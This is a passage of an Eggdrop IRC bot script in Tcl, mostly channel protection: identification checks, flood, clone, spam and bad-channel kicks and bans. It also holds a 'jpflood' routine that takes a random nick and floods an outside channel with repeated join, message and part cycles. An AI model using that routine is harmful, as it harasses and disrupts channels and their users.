  if {[matchattr $nick G]} { putlog "CHeK GuaRd $nick" ; set chk_reg($nick) "1" ; puthlp "WHOIS $nick" ; return 0 }
  foreach x [channels] { if {[isop $botnick $x] && [onchan $nick $x]} { if {[matchattr $nick P] && ![isop $nick $x]} { putlog "WHOIS $nick TO GeT a@p" ; set chk_reg($nick) "1" ; puthlp "WHOIS $nick" ; return 0 } ; if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} { putlog "WHOIS $nick TO geT avoIcE" ; set chk_reg($nick) "1" ; puthlp "WHOIS $nick" ; return 0 } } }
}
set ath 0
bind raw - 307 reg_chk
proc reg_chk {from keyword arg} {
  global chk_reg botnick owner notc squ ath
  set nick [lindex $arg 1]
  if {$nick == $botnick} { return 0 }
  putlog "NICK $nick IS IDENTIFY..!"
  if {[info exists chk_reg($nick)]} { set chk_reg($nick) "0" }
  set athz $ath
  if {$athz == 1} {
    set ath 0
    chattr $nick +Q
    foreach x [getuser $nick HOSTS] { delhost $nick $x }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    #set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    if {[matchattr $nick Z]} { puthlp "NOTICE $nick :!OWnER!" } elseif {[matchattr $nick n]} { puthlp "NOTICE $nick :!aDmIN!" } elseif {[matchattr $nick m]} { puthlp "NOTICE $nick :!MasTeR!" } else { puthlp "NOTICE $nick :!accepteD!" }
    saveuser
  }
  if {[matchattr $nick P] || [matchattr $nick v]} {
    foreach x [channels] {
      if {[isop $botnick $x] && [onchan $nick $x]} {
        if {![string match "*k*" [getchanmode $x]]} { if {[matchattr $nick P]} { if {![isop $nick $x]} { puthelp "MODE $x -k+o 6identified.auto.@p $nick" } } ; if {[matchattr $nick v]} { if {![isvoice $nick $x] && ![isop $nick $x]} { puthelp "MODE $x -k+v 6identified.auto.voice $nick" } } } { if {[matchattr $nick P]} { if {![isop $nick $x]} { puthelp "MODE $x +o $nick" } } ; if {[matchattr $nick v]} { if {![isvoice $nick $x] && ![isop $nick $x]} { puthelp "MODE $x +v $nick" } } }
} } } }
bind raw - 318 end_whois
proc end_whois {from keyword arg} {
  global chk_reg notc ath
  set nick [lindex $arg 1]
  set athz $ath
  if {$athz == 1} { puthlp "NOTICE $nick :You're NOT Identify..!" ; set ath 0 }
  if {[info exists chk_reg($nick)]} {
    if {$chk_reg($nick) != "0"} {
      putlog "NICK $nick IS NoT IDENTIFY..!"
      if {[matchattr $nick G] && ![matchattr $nick Q]} {
        foreach x [channels] {
          if {[onchan $nick $x] && [botisop $x]} {
            set banset "*!*[getchanhost $nick $x]"
            putsrv "KICK $x $nick :1that nick required to 2identify"
            if {$banset != "*!*@*" && $banset != ""} { if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -k+b 6unidentified.guard.nick $banset" } { putserv "mode $x +b $banset" } }
            return 0
        } }
        } elseif {[matchattr $nick P] && ![matchattr $nick Q]} { puthlp "NOTICE $nick :a@p identify 1st..!" 
      } elseif {[matchattr $nick v] && ![matchattr $nick Q]} { puthlp "NOTICE $nick :avoice identify 1st..!" }
      if {$chk_reg($nick) != "1"} { puthlp "NOTICE $chk_reg($nick) :$nick not identify..!" }
      unset chk_reg($nick)
} } }
set timezone "GMT"
set joinme $owner
set double 0
set deopme ""
bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
proc telljoin {chan} {
  global joinme notc botnick
  if {![validchan $chan]} { return 0 }
  if {$joinme != ""} { if {![onchan $joinme $chan]} { puthlp "NOTICE $joinme :JoIN $chan" ; set joinme "" } }
}
proc chkspam {chan} {
  global invme notc botnick
  if {![validchan $chan] || ![botonchan $chan]} { return 0 }
  foreach x [chanlist $chan] {
    set mhost "@[lindex [split [getchanhost $x $chan] @] 1]"
    if {[info exists invme($mhost)]} {
	  putlog "exist invme $x $invme($mhost) $chan chkspam"
      if {![matchattr $x f] && ![isop $x $chan]} {
        if {[isop $botnick $chan]} {
          set bannick($x) "$mhost"
          if {$invme($mhost) == "autojoin msg"} {
            if {![isvoice $x $chan]} { putsrv "KICK $chan $x :spam from 2$mhost 1$invme($mhost) - 2r1emote 2o1ff, please.." }
          }                          { putsrv "KICK $chan $x :spam from 2$mhost 1$invme($mhost)" }
          } {
          foreach c [chanlist $chan f] {
            if {[isop $c $chan]} {
              if {$invme($mhost) == "autojoin msg"} {
				  putlog "report $x $invme($mhost) in $chan to $c"
				  set sendspam "!kick [zip "$chan $x spam from 2$mhost 1$invme($mhost) - 2r1emote 2o1ff, please.. 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam"
			  } { set sendspam "!kick [zip "$chan $x spam from 2$mhost 1$invme($mhost) 2-report by1 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" ; putlog "report $x $invme($mhost) in $chan to $c" }
} } } } } }
catch {unset invme($mhost)}
}
proc testmask {} { global ismaskhost ; set ismaskhost [maskhost "*!*@*"] }
utimer 2 testmask
proc reset_host {} { global jfhost ; catch { unset jfhost } }
proc savechan {} {
  savechannels
  foreach x [channels] {
    set cflag "c$x"
    set cflag [string range $cflag 0 8]
    set cinfo [channel info $x]
    if {![validuser $cflag]} {
      adduser $cflag "%!%@%"
      if {[string match "*+greet*" $cinfo]} {
        chattr $cflag "-hp+AJSPTRUED"
        setuser $cflag XTRA "JP" 5
        setuser $cflag XTRA "CHAR" 250
        setuser $cflag XTRA "RPT" 5
        setuser $cflag XTRA "CAPS" 80
      } { chattr $cflag "-hp+A" }
    }
  }
  foreach x [userlist A] {
    set tmp "0"
    foreach y [channels] { set cflag "c$y" ; set cflag [string range $cflag 0 8] ; if {[string tolower $x] == [string tolower $cflag]} { set tmp "1" } }
    if {$tmp == "0"} { deluser $x ; putlog "remove flag channel $x" }
  }
  saveuser
}
proc join_chk {nick uhost hand chan} {
  global botnick nwo deopme double invme ex_flood notc quick kops jfhost jpnick is_m exflood
  global cmd_chn cmd_by cmd_msg cmd_case bannick botname notm massjoin ismaskhost op_it
  global bchan bcqueue bcnicks
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set cinfo [channel info $chan]
  if {$nick == $botnick} {
    catch {unset is_m($chan)}
    if {[matchattr $cflag S]} { if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] } ; if {![istimer "chkautomsg"]} { timer 1 { putlog "chkautomsg" } } }
    set double 0
    if {[string tolower $cmd_chn] == [string tolower $chan]} {
      if {$cmd_case == "1"} { utimer 90 del_nobase ; pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}" ; set cmd_chn "" ; return 0 }
      if {$cmd_case == "2"} { utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]} { set cmd_chn "" ; return 0 }
        if {$cmd_case == "3"} { utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg] } { set cmd_chn "" ; return 0 }
      }
      utimer 15 [list telljoin $chan]
      return 0
    }
  if {[info exists op_it($nick)]} { catch {unset op_it($nick) } ; opq $chan $nick }
  if {[isutimer "chkspam $chan"]} { foreach x [utimers] { if {[string match "*chkspam $chan*" $x]} { chkspam $chan ; killutimer [lindex $x 2] } } }
  if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
  set mhost "@[lindex [split $uhost @] 1]"
  if {$mhost == "@evochat" || [string match "*evochat.id" $mhost]} { putsrv "AWAY" }
  if {![isop $botnick $chan]} { if {[info exists invme($mhost)]} { if {![isutimer "chkspam $chan"]} { chkspam $chan } } ; return 0 }
  if {[matchattr $cflag J]} {
    if {[info exists ismaskhost]} {
      if {![isutimer "reset_host"]} { utimer 10 reset_host } ; set chkhost [maskhost "*!*$mhost"]
      if {![info exists jfhost($chkhost$chan)]} { set jfhost($chkhost$chan) 1 } { incr jfhost($chkhost$chan) ; if {$jfhost($chkhost$chan) == 5} { set bannick($nick) $chkhost ; putsrv "KICK $chan $nick :1fLood anticipated from 4$chkhost" ; return 0 } }
    }
    if {![isutimer "jc $chan"]} { utimer 3 [list jc $chan] ; set massjoin($chan) 1
      } {
      if {![info exists massjoin($chan)]} { set massjoin($chan) 1 }
      set massjoin($chan) [incr massjoin($chan)]
      if {![isutimer "TRAFFIC $chan"]} {
        if {$massjoin($chan) >= 10} {
          unset massjoin($chan)
          if {[string match "*+greet*" $cinfo]} {
            utimer 30 [list putlog "TRAFFIC $chan"]
            if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} { putserv "mode $chan +bMR *!*@heavy.join.flood.channel.temporary.moderate" ; return 0 }
  } } } } }
  if {[matchattr $cflag L]} { foreach u [timers] { if {[string match "*chk_limit*" $u]} { killtimer [lindex $u 2] } } ; timer 1 [list chk_limit $chan] }
  if {$nick == $deopme} { putsrv "KICK $chan $nick :1self 4de@p1 revenge" ; set deopme "" ; return 0 }
  if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} { whoisq $nick }
  if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
    if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
      set cret [getuser $cflag XTRA "VC"]
      foreach ct [utimers] { if {[string match "*voiceq*" $ct]} { if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} { set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] } } }
      utimer $cret [list voiceq $chan $nick]
  } }
  ##if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
  if {[matchattr $nick f]} { return 0 }
  if {([string match "*\}*" $nick] || [string match "*\{*" $nick]) && ([string length $nick] == 8) && (![string match "*V{A}LNet*" $nick])} { set bannick($nick) "$uhost" ; putsrv "kick $chan $nick :ERRnick 2possible 1flooder!" ; return 0 }
  if {[matchattr $hand K]} { akick_chk $nick $uhost $chan ; return 0 }
  if {[info exists ex_flood($mhost)]} {
    putlog "$ex_flood($mhost) exist"
    set bannick($nick) "$uhost"
    if {$ex_flood($mhost) == 0} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :2akill1 from 2$mhost1 on last quit" } }
      } elseif {$ex_flood($mhost) == 5} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :2excess flood1 on last quit done by $exflood($mhost)" } }
      } elseif {$ex_flood($mhost) == 2} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :2invite1 on quit msg done by $exflood($mhost)" } }
      	  } elseif {$ex_flood($mhost) == 3} { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :2invite1 on part msg done by $exflood($mhost)" } }
      	  } elseif {$ex_flood($mhost) == 4} {
      if {![matchattr $cflag M]} { puthlp "KICK $chan $nick :2joinpart1 from 2$mhost1 less than2 [getuser $cflag XTRA "JP"]1 2nd"
      } { if {![string match "*k*" [getchanmode $chan]]} { putserv "mode $chan -k+b 6j.o.i.n.p.a.r.t $bannick($nick)" } { putserv "mode $chan +b $bannick($nick)" } }
    } else { foreach x [channels] { if {[onchan $nick $x] && [isop $botnick $x]} { putsrv "KICK $x $nick :1badwo4rd1 on quit or part msg 2$ex_flood($mhost)1 done by $exflood($mhost)" } } }
    utimer 10 "unset ex_flood($mhost)"
    return 0
  }
  if {[info exists invme($mhost)]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :spam from 2$mhost 1$invme($mhost)" ; unset invme($mhost) ; return 0 }
  if {[string match "*+greet*" $cinfo]} { badnick_chk $nick $uhost $hand $chan }
  if {[string match "*+trojan*" $cinfo]} { set bmask_check $nick!$uhost ; trojanchk $nick $bmask_check $uhost $chan }
  if {[string match "*+echox*" $cinfo]} { echoxchk $nick $uhost $hand $chan }
  set chan [string tolower $chan]
  if {[string match "*+nodesynch*" $cinfo]} { if {![matchattr $nick f]} { utimer 10 [list autokick $chan $nick] } }
  if {[matchattr $cflag O]} {
    if {[string match "*$mhost" $botname]} { return 0 }
    set counter 0
    set maxclone [getuser $cflag XTRA "CLONE"]
    foreach knick [chanlist $chan] {
      if {[string match "*$mhost" [getchanhost $knick $chan]]} {
        if {[matchattr $knick f]} { return 0 }
        if {[isop $knick $chan]} { return 0 }
        if {[isvoice $knick $chan]} { if {![info exists kops]} { return 0 } }
        set counter [incr counter]
        if {$counter > $maxclone} { set bannick($nick) "$mhost" ; putsrv "KICK $chan $nick :1found $counter 2clone1 from 2$mhost1 max2 $maxclone1, wait a moment! 4banned1: 3 minutes" ; return 0 }
  } } }
  set chan [string toupper $chan]
  if {[matchattr $cflag P]} { if {![info exists jpnick($nick)]} { set jpnick($nick) "1" ; utimer [getuser $cflag XTRA "JP"] [list munset $nick] } }
  if {[string match "*+badchan*" $cinfo]} {
    if {[lsearch $bchan(chans) $chan] == -1 && ([lsearch $bchan(chans) global] == -1 || [lsearch $bchan(exempt) $chan] > -1)} {return 0}
    if {$bchan(protect-hosts) != ""} { foreach i $bchan(protect-hosts) { if {[string match [string tolower $i] $mhost]} {return 0} } }
    if {[bc_flood $nick $uhost]} { return 0}
	set bcnicks($nick) $chan
    putserv "whois $nick"
  }
  return 0
}
proc jc {chan} { }
proc munset {nick} { global jpnick ; catch {unset jpnick($nick)} }
proc goback {} {
  global keep-nick nick botnick
  if {[istimer "goback"]} { return 0 }
  foreach x [utimers] { if {[string match "*goback*" $x]} { killutimer [lindex $x 2] } }
  if {[getuser "config" XTRA "NICK"]!=""} { set nick [dezip [getuser "config" XTRA "NICK"]] }
  set keep-nick 1
  if {$botnick == $nick} { return 0 }
  puthlp "NICK $nick"
}
catch { bind rejn - * rejn_chk }
proc rejn_chk {unick uhost handle chan} { if {![isutimer "TRAFFIC $chan"]} { utimer 30 [list putlog "TRAFFIC $chan"] } }
catch { bind splt - * splt_deauth }
proc splt_deauth {unick uhost handle channel} {
  if {[matchattr $unick Q]} {
    chattr $unick -Q ; foreach x [getuser $unick HOSTS] { delhost $unick $x }
    set hostmask "${unick}!*@*" ; setuser $unick HOSTS $hostmask
    saveuser ; return 0
} }
bind sign - * sign_deauth
proc sign_deauth {unick uhost hand chan rest} {
  global ex_flood botnick notc nick badwords iskick exflood
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$unick == $nick} { putsrv "NICK $nick" }
  if {[info exists iskick($unick$chan)]} { unset iskick($unick$chan) }
  if {[isop $botnick $chan]} { if {[matchattr $cflag L]} { foreach u [timers] { if {[string match "*chk_limit*" $u]} { killtimer [lindex $u 2] } } ; timer 1 [list chk_limit $chan] } }
  if {[matchattr $unick Q]} {
    chattr $unick -Q
    foreach x [getuser $unick HOSTS] { delhost $unick $x }
    set hostmask "${unick}!*@*"
    setuser $unick HOSTS $hostmask
    saveuser
    return 0
  }
  if {[string match "*-greet*" [channel info $chan]]} { return 0 }
  if {[matchattr $unick f]} { return 0 }
  if {![isop $botnick $chan]} { return 0 }
  set mhost "@[lindex [split $uhost @] 1]"
  if {![string match "Quit:*" $rest]} {
   if {[string match "*AKILL ID*" $rest] && ![string match "Quit:*" $rest]} { set ex_flood($mhost) "0" ; putlog "AKILL from $unick $uhost" 
   } elseif {[string match "*Excess Flood*" $rest]} { if {[matchattr $cflag S]} { set ex_flood($mhost) "5" ; set exflood($mhost) "2$unick14(2$uhost14)" ; putlog "Excess Flood from exflood($mhost)" } }
  } elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} { foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 } }
  set ex_flood($mhost) "2" ; set exflood($mhost) "2$unick14(2$uhost14)" ; putlog "Invite/advert from $unick $uhost -> $rest"
  } else { foreach badword [string tolower $badwords] { if {[string match *$badword* [uncolor [netext [string tolower $rest]]]]} { set ex_flood($mhost) $badword ; set exflood($mhost) "2$unick14(2$uhost14)" ; putlog "Badword from $exflood($mhost) -> $badword" } } }
 return 0
}
bind part - * part_deauth
proc part_deauth {nick uhost hand chan {msg ""}} {
  global lockchan botnick ex_flood notc badwords jpnick iskick exflood
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set real $msg ; set msg [uncolor $msg]
  if {[info exists iskick($nick$chan)]} { unset iskick($nick$chan) }
  if {$nick == $botnick} { foreach x [utimers] { if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] } } ; return 0 }
  if {[isop $botnick $chan]} {
    if {[isutimer "voiceq $chan $nick"]} { foreach x [utimers] { if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] } } }
    if {[matchattr $cflag L]} { foreach u [timers] { if {[string match "*chk_limit*" $u]} { killtimer [lindex $u 2] } } ; timer 1 [list chk_limit $chan] }
  }
  if {[matchattr $nick Q]} {
    foreach x [channels] { if {[string tolower $x] != [string tolower $chan]} { if {[onchan $nick $x]} { return 0 } } }
    chattr $nick -Q
    foreach x [getuser $nick HOSTS] { delhost $nick $x }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    saveuser
  }
  if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} { putsrv "INVITE $nick :$chan" }
  if {[string match "*-greet*" [channel info $chan]]} { return 0 }
  if {[isop $botnick $chan]} {
    set mhost "@[lindex [split $uhost @] 1]"
    if {[info exists msg]} {
      if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
        foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 } }
        putlog "Invite/advert from $nick!$uhost -> $msg" ; set ex_flood($mhost) "3" ; set exflood($mhost) "2$nick14(2$uhost14)"
      } { foreach badword [string tolower $badwords] { if {[string match *$badword* [netext [string tolower $msg]]]} { set ex_flood($mhost) $badword ; set exflood($mhost) "2$nick14(2$uhost14)" ; putlog "Badword from $nick $uhost -> $msg" } } }
  set resume "T"
  if {[string match "*-greet*" [channel info $chan]]} { set resume "F" }
  if {![isop $botnick $chan]} { set resume "F" }
  if {![info exists kops]} { if {[isop $nick $chan]} { set resume "F" } }
  # Tsunami Flood PRoTECTION
  if {[string length $msg] > 75} {
    set chr 0
    set cnt 0
    while {$cnt < [string length $real]} { if [isflood [string index $real $cnt]] { incr chr } ; incr cnt }
    if {$chr > 30} {
      if {$resume == "T"} {
        putserv "mode $chan +b $mhost"
putlog "part flood $nick $mhost in $chan msg-> [string length $msg] real-> [string length $real]"
        if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} { putserv "mode $chan +bMR *!*@heavy.flood.channel.temporary.moderate" ; return 0 }
      }
      return 0
  } }
  }
    if {[info exists msg]} { if {$msg != ""} { return 0 } }
    if {[matchattr $cflag P]} { set chan [string toupper $chan] ; if {[info exists jpnick($nick)]} { set ex_flood($mhost) "4" ; set exflood($mhost) "2$nick14(2$uhost14)" ; putlog "Forbiden Part/Quit from $nick $uhost" } }
  }
  return 0
}
proc val {string} {
  set arg [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
  set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
  return $arg2
}
set cmd_chn ""
set cmd_by ""
set cmd_msg ""
set cmd_case ""
bind join - * join_jf
proc join_jf {nick uhost hand chan} {
  global botnick quick jpfchn jpfmsg jpfidx
  if {![info exists jpfmsg]} { return 0 }
  if {$nick != $botnick} { return 0 }
  if {$chan != $jpfchn} { return 0 }
  if {$quick == "1"} { putqck "PRIVMSG $chan :$jpfmsg," 
  } else { putsrv "PRIVMSG $chan :$jpfmsg," }
  incr jpfidx
  if {$jpfidx >= 4} { 
    catch { channel remove $jpfchn }
    catch { unset jpfchn }
    catch { unset jpfmsg }
    catch { unset jpfidx }
    puthlp "AWAY"
    return 0
  }
  if {$quick == "1"} { putqck "part $chan :$jpfmsg" } else { putsrv "part $chan :$jpfmsg" }
}
proc pub_jpflood {nick uhost hand channel rest} {
  global jpfchn jpfmsg jpfidx notc squ
  if {[string index $rest 0] != "#" || $rest == ""} { puthlp "NOTICE $nick :Usage: jpflood #channel message" ; return 0 }
  if {[validchan [lindex $rest 0]]} { puthlp "NOTICE $nick :dOnt UsE ExIsT cHanneL..!" ; return 0 }
  set jpfmsg " n0 Reas0n "
  if {[lindex $rest 1] != ""} { set jpfmsg [lindex $rest 1] }
  set jpfchn [lindex $rest 0]
  set jpfidx 0
  catch { clearqueue all }
  pub_randnick $nick $uhost $hand $channel ""
  utimer 10 hazar
}
proc hazar {} {
  global jpfchn
  utimer 120 goback
  channel add $jpfchn
  catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}
## badchan start
bind pub n `+badchan pub_+badchan
setudef flag badchan
proc pub_+badchan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*+badchan*" [channel info $chan]]} { puthelp "NOTICE $nick :$chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +badchan }
  puthelp "NOTICE $nick :BadChan Kick $chan \[9ON\]"
  saveuser
}
bind pub n `-badchan pub_-badchan
proc pub_-badchan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*-badchan*" [channel info $chan]]} { puthelp "NOTICE $nick :BadChan Kick $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -badchan }
  puthelp "NOTICE $nick :BadChan Kick $chan \[4Off\]"
  saveuser
}
if {[info exists bchan]} {unset bchan}
set bchan(rescan) 1
set bc_flood 4:5
set bchan(exempt) ""
set bchan(protect-hosts) { *!*@perusuh.com }
if {[info exists bcqueue]} {unset bcqueue}
set bchan(chans) ""
proc bchan_read {} {
  global bchan
  set fd [open scripts/badchan.conf r]
  while {![eof $fd]} {
    set inp [gets $fd]
    if {[string trim $inp " "] == ""} {continue}
    set ban [lrange $inp 1 e]
    set chan [string tolower [lindex $inp 0]]
    if {[lsearch $bchan(chans) $chan] == -1} {lappend bchan(chans) $chan}
    lappend bchan($chan) $ban
  }
  close $fd
  putlog "badchan.conf loaded."
}
if {[file exists scripts/badchan.conf]} {bchan_read} {putlog "badchan.conf not found!"}
proc bc_flood_init {} {
  global bc_flood bc_flood_num bc_flood_time bc_flood_array
  if {![string match *:* $bc_flood]} {putlog bchan: var bc_flood not set correctly. ; return 1}
  set bc_flood_num [lindex [split $bc_flood :] 0]
  set bc_flood_time [lindex [split $bc_flood :] 1]
  set i [expr $bc_flood_num - 1]
  while {$i >= 0} { set bc_flood_array($i) 0 ; incr i -1 }
} ; bc_flood_init
proc bc_flood {nick uhost} {
  global bc_flood_num bc_flood_time bc_flood_array
  if {$bc_flood_num == 0} {return 0}
  set i [expr $bc_flood_num - 1]
  while {$i >= 1} { set bc_flood_array($i) $bc_flood_array([expr $i - 1]) ; incr i -1 }
  set bc_flood_array(0) [unixtime]
  if {[expr [unixtime] - $bc_flood_array([expr $bc_flood_num - 1])] <= $bc_flood_time} {
    putlog "bchan: Flood detected from $nick."
    newignore [join [maskhost *!*[string trimleft $uhost ~]]] bchan flood 2
    return  1
  } {return 0}
}
bind raw - 319 bc_whois
proc bc_whois {from key args} {
  global bchan bcqueue bcnicks notc mhost bannick
  set args [join $args]
  set nick [lindex $args 1]
  if {[info exists bcnicks($nick)]} {set chan $bcnicks($nick)} {return 0}
  set chans [string tolower [lrange $args 2 e]]
  if {[lsearch $bchan(exempt) $chan] == -1 && $bchan(global) != ""} {set bans $bchan(global)} {set bans ""}
  if {[lsearch $bchan(chans) $chan] > -1} {set bans "$bans $bchan($chan)"}
  foreach tok $chans {
    set tok [string trimleft $tok ":@+"]
    foreach ban $bans {
      if {[string match [lindex $ban 0] $tok]} {
        set badchanhost "*!*[string trimleft [string range [getchanhost $nick $chan] [string first "!" [getchanhost $nick $chan]] end] ~]"
        putlog "args: $args, ban: $ban"
        if {[onchan $nick $chan]} { putserv "KICK $chan $nick :1badch4an1 [string trim [lrange $ban 0 0] "*"] 2[lrange $ban 1 e]" ; putserv "mode $chan +b $badchanhost" }
        return 0
  } } }
  return 0
}
bind pub n !gbclist bc_glist
proc bc_glist {1 2 3 4 5} {bc_list $1 $2 $3 global $5}
bind pub n !bclist bc_list
proc bc_list {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
  set i 1
  puthelp "notice $nick :BadChans for $chan..."
  foreach ban $bchan($chan) { puthelp "notice $nick :$i) $ban" ; incr i }
}
bind pub n !gabc bc_gadd
proc bc_gadd {1 2 3 4 5} {bc_add $1 $2 $3 global $5}
bind pub n !abc bc_add
proc bc_add {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  if {![string match *\\\** [lindex $args 0]]} {puthelp "notice $nick :syntax is: !abc <chanmask> \[reason\]" ; return 1}
  set args [string trimright "[string tolower [lindex $args 0]] [lrange $args 1 e]" " "]
  if {[lsearch $bchan(chans) $chan]} {lappend bchan(chans) $chan}
  lappend bchan($chan) $args
  puthelp "notice $nick :[lindex $args 0] was added to $chan's badchan list."
  bchan_save
  return 1
}
bind pub n !grbc bc_grem
proc bc_grem {1 2 3 4 5} {bc_rem $1 $2 $3 global $5}
bind pub n !rbc bc_rem
proc bc_rem {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  set args [string tolower [lindex [join $args] 0]]
  if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
  if {![string match *\\\** $args]} {puthelp "notice $nick :syntax is: !rbc <chanmask>" ; return 1}
  set i 0
  set temp ""
  foreach ban $bchan($chan) { if {[string compare $args [lindex $ban 0]] == 0} {incr i} {lappend temp $ban} }
  if {$i > 0} {
    if {$temp != ""} {set bchan($chan) $temp} {
      unset bchan($chan)
      set temp [lsearch $bchan(chans) $chan]
      if {$temp == -1} {putlog "bchan: I'm confused." ; return 1}
      set bchan(chans) [lreplace $bchan(chans) $temp $temp]
    }
    puthelp "notice $nick :$args was removed from $chan's badchan list."
    bchan_save
  } {puthelp "notice $nick :$args was not found in $chan's badchan list."}
  return 1
}
proc bchan_save {} {
  global bchan
  set fd [open scripts/badchan.conf w]
  foreach chan $bchan(chans) { foreach ban $bchan($chan) { puts $fd "$chan $ban" } }
  close $fd
}
##badchan stop

bind time -  "*2 * * * *" auto_ident
proc auto_ident {min h d m y} { timer 5 ident_it ; auto_ping "0" "0" "0" "0" "0" }
proc ident_it {} {
  global nick altnick botnick nickpass altpass ex_flood exflood invme pingchan nwo chk_reg
  global kickme deopme cmd_chn cmd_msg squ twice_msg keep-nick version notc lastkey commandkc
  global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
  putlog "auTO ReSETING VaRIaBLE & IDeNTIFY"
  catch { channel remove $jpfchn }
  catch { unset jpfchn }
  catch { unset jpfmsg }
  catch { unset jpfidx }
  catch {unset op_it}
  catch {unset is_m}
  catch {unset chk_reg}
  catch {unset flooddeop}
  catch {unset floodnick}
  catch {unset floodkick}
  catch {unset lastkey}
  catch {unset ex_flood}
  catch {unset exflood}
  catch {unset invme}
  catch {unset pingchan}
  catch {unset twice_msg}
  catch {unset commandkc}
  catch {unset kickme}
  set deopme ""
  set cmd_chn ""
  set cmd_msg ""
  if {${server-online} == 0} { return 0 }
  if {![string match "HAK??????????" $botnick] && ![string match "HAK??????" $botnick] && ![string match "ERR??????????" $botnick]} { if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback } } { goback }
  if {$botnick == $nick && $nickpass != ""} { putsrv "NickServ identify $nickpass" }
  if {$botnick != $nick && $nickpass != ""} { putsrv "NickServ identify $nick $nickpass" }
  if {$squ != $nwo} { set nwo $squ }
  if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}
bind time -  "*4 * * * *" auto_ping
proc auto_ping {min h d m y} {
  global botnick repeat_last repeat_person capsnick nwo notc notc_chn bannick
  global unop wait_ping server-online jpnick igflood is_ban iskick 
  if {${server-online} == 0} { catch { unset wait_ping } ; return 0 }
  catch {unset iskick}
  catch {unset is_ban}
  catch {unset igflood}
  catch {unset jpnick}
  catch {unset unop}
  catch {unset bannick}
  catch {unset notc_chn}
  catch {unset capsnick}
  catch {unset repeat_person}
  catch {unset repeat_last}
  ## puthlp "PRIVMSG $botnick :\001PING [unixtime]\001"
  if {![info exists wait_ping]} { set wait_ping 1 } else { set wait_ping [expr $wait_ping + 1] }
  if {$wait_ping > 9} { catch { unset wait_ping } }
}
proc remain {} {
  global botnick uptime timezone notc notd vern longer awaym awaybanner awban
  set totalyear [expr [unixtime] - $uptime]
  if {$totalyear >= 31536000} {
    set yearsfull [expr $totalyear/31536000]
    set years [expr int($yearsfull)]
    set yearssub [expr 31536000*$years]
    set totalday [expr $totalyear - $yearssub]
  }
  if {$totalyear < 31536000} { set totalday $totalyear ; set years 0 }
  if {$totalday >= 86400} {
    set daysfull [expr $totalday/86400]
    set days [expr int($daysfull)]
    set dayssub [expr 86400*$days]
    set totalhour [expr $totalday - $dayssub]
  }
  if {$totalday < 86400} { set totalhour $totalday ; set days 0 }
  if {$totalhour >= 3600} {
    set hoursfull [expr $totalhour/3600]
    set hours [expr int($hoursfull)]
    set hourssub [expr 3600*$hours]
    set totalmin [expr $totalhour - $hourssub]
  }
  if {$totalhour < 3600} { set totalmin $totalhour ; set hours 0 }
